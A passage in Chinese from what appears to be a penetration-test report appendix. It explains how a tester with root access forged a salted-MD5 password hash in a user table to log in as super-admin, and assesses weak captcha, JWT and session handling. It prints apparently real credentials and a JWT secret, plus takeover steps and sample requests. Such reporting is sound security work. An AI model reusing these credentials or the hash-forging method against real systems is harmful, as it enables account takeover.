                                                        ↓
                        写一个自己算出来的合法哈希进 t_user（不需要知道原密码）
                                                        ↓
                        用那个已知明文登录 → 拿到 root 超管 token → 还原原哈希
```

### E.2 为什么可行：三层原因，缺一不可

| 层     | 原因                                    | 本次是否成立                                   |
| ----- | ------------------------------------- | ---------------------------------------- |
| ① 权限层 | 攻击者已经拿到能写账号库的权限（root / DB 管理员）        | ✅ root RCE + `baseadmin/MyPassword13579` |
| ② 存储层 | 密码哈希**可以离线自行生成**（盐和哈希存放在一起，没有服务端密钥参与） | ✅ 盐就藏在 48 位字符串里                          |
| ③ 认证层 | 登录只有"密码"一道闸，验证码不构成有效防护                | ✅ 验证码可人工/OCR 识别，无失败锁定                    |

**任何一层被堵住，这条路就走不通。**  
甲方真正的漏洞在第 ②③ 层——即使没有 root，只要拿到库（比如 SQL 注入、备份泄露），也能用同样的方法登录。

### E.3 技术细节：那 48 位到底是什么

`t_user.password` 是 **48 位十六进制**，不是常见的 32 位 MD5。结构是：

```
MD5(明文密码 + 16位数字盐) 的 32 位结果，与 16 位盐按规则交错拼接 → 48 位
```

反编译 `intelctrl-common-1.0-SNAPSHOT.jar` 里的 `com.veckchina.intelctrl.common.util.MD5Util` 可确认：

```java
public static String  getSaltMD5(String password);          // 生成 48 位
public static boolean getSaltverifyMD5(String pw, String stored);  // 校验
```

盐是 `new Random().nextInt(99999999)` 两次拼出来、不足 16 位用 `"0"` 补齐——**纯数字、和哈希存在同一个字段里、没有 pepper、没有 HMAC 密钥**。

**这意味着：任何人只要知道算法，就能为任意明文造出合法哈希。** 算法就在 jar 里，jar 在服务器上。

> 💡 **一个刺眼的细节**：`MD5Util.main()` 里作者自己写了  
> `System.out.println(MD5Util.getSaltMD5("MyPassword13579"));`  
> 也就是说，开发者的测试样例用的就是这台机器全站通用的那个口令——MySQL、Redis、MinIO 全是 `MyPassword13579`。这种"一套密码打天下"的习惯，本身就是这次能一路打穿的原因之一。

**实测：pass-the-hash 不成立（重要，别写错）**

很多人以为"前端发的 password 是哈希，那我把库里的哈希直接发过去就行"。**不行**，本次实测否决：

```
日志里抓到的真实请求：
POST /gateway/intelctrl-user/admin/login?fullname=root&password=e5ea3e427a...&checkKey=...&captcha=

直接重放这条（password 填库里的哈希）：
→ {"msg":"用户名和密码不匹配","err_code":91012102}
```

原因：服务端拿到的 `password` 会**再走一遍 `getSaltverifyMD5`**，即把它当明文重新加盐算一次。所以哈希不能直接当密码用——**必须造一个"某个已知明文的合法哈希"覆盖进去**。

### E.4 验证码为什么不算防护

取图接口（**参数名是 `key`，不是 `checkKey`**，这里踩过大坑）：

```bash
curl -s 'http://<host>:9101/randomImage?key=<任意随机串>'
# → ["data:image/jpg;base64,/9j/4AAQSkZJRgABAQ..."]
```

防护力评估：

| 维度         | 实际情况                           | 结论          |
| ---------- | ------------------------------ | ----------- |
| 位数         | 4 位字母数字                        | 弱           |
| 有效期        | 60 秒（`login.captcha.time: 60`） | 够用但无意义      |
| **失败次数限制** | **无**                          | ❌ 致命        |
| **账号锁定**   | **无**                          | ❌ 致命        |
| 是否绑定会话     | `checkKey` 由客户端随意生成            | ❌ 可任意重置     |
| 机器可读性      | 只要把 base64 落成图片直接看就行           | ❌ 人工/OCR 秒过 |

**结论：验证码只做到了"必须经过"，没做到"拦得住"。** 无失败锁定 + 4 位 = 理论上可无限次爆破（本次没爆破，因为我直接拿到了明文哈希路径，没必要）。

### E.6 会话机制：token 为什么能长期用

```yaml
# nacos: common-jwt-config.yaml
intelctrl.jwt:
  secret: f4e2e52034348f86b67cde581c0f9eb57ue0e1k3[veck]
  expire: 300          # 分钟 → access token ≈ 5 小时
  refreshExpire: 10080 # 分钟 → 7 天
  redisExpire: 11520
  cookieName: token
```

- 算法 HS256，payload 极简：`{"id":111,"type":2,"exp":...}`，**没有随机 jti、没有绑定 IP/UA**。
- 服务端校验顺序：**JWT 签名 → exp → Redis 里的 `loginToken:<id>:<type>` 是否存在**。
- 前端存 `localStorage`，不存 HttpOnly Cookie → **XSS 即可直接偷 token**，且 token 5 小时内可重复使用。

**实测的错误码字典（排障很有用）**：

| err_code | msg                                  | 含义                                     |
| -------- | ------------------------------------ | -------------------------------------- |
| 91004401 | 未认证                                  | 没带 token                               |
| 91004402 | 认证失败                                 | 签名错 / Redis 里没这个会话                     |
| 91004403 | 认证过期                                 | 签名对，但 exp 已过                           |
| 91012101 | 用户不存在                                | 账号名查不到（**同名歧义也报这个**）                   |
| 91012102 | 用户名和密码不匹配                            | 哈希校验失败（pass-the-hash 就死在这）             |
| 91012105 | 验证码错误或超时                             | captcha 没带 / 不对 / 过期                   |
| 91011001 | `[Ljava.lang.StackTraceElement;@...` | 通用异常兜底，**把异常对象 toString 直接吐给前端，是信息泄露** |

### E.7 一个真实发现：配置中心和运行态漂移了

我一度想"自己签一个 token"，结果发现：

```
nacos 里配的 secret = f4e2e52034348f86b67cde581c0f9eb57ue0e1k3[veck]
用它去验 Redis 里一把真实 token 的签名 → 不通过
```

也就是**服务进程实际在用的密钥，和配置中心里现存的值不一致**（服务 10-08 启动后配置被改过，而密钥是启动时加载的，没热更新）。

**别把这个当小事**：说明"读配置中心"不等于"拿到运行态真相"。要确认实际生效的密钥，只能靠**行为验证**（发请求看返回码），不能只看配置文件。本次也因此确认了不能自签，最终走了"造哈希"这条路。

### E.8 一路上踩的 6 个坑

| # | 现象                                         | 根因                                       | 正解                                         |
| - | ------------------------------------------ | ---------------------------------------- | ------------------------------------------ |
| 1 | `randomImage` 返回 `91011001` 堆栈错误，以为验证码服务坏了 | 参数名错了，前端用的是 **`key`** 不是 `checkKey`      | `?key=<随机串>`                               |
| 2 | 报"用户不存在"                                   | `zhao` 有两个同名账号（803/804），`fullname` 查询有歧义 | 换唯一用户名（`root`）                             |
| 3 | 把库里哈希当密码发 → "用户名和密码不匹配"                    | 服务端会把收到的值**再算一遍**                        | 要造合法哈希覆盖，不是重放                              |
| 4 | 常见口令字典（100+ 条）全不中                          | 密码确实不是弱口令                                | 别死磕爆破，走"造哈希"更快                             |
| 5 | PowerShell 里拼 SSH 命令引号全乱                   | pwsh 会吃掉引号/`$`/重定向                       | **把脚本 base64 传上去再 `bash` 执行**              |
| 6 | SSH 频繁 `Connection closed`                 | 目标 load 68、sshd MaxStartups 打满           | 加 `ServerAliveInterval`，两次操作之间 sleep 2-3 秒 |
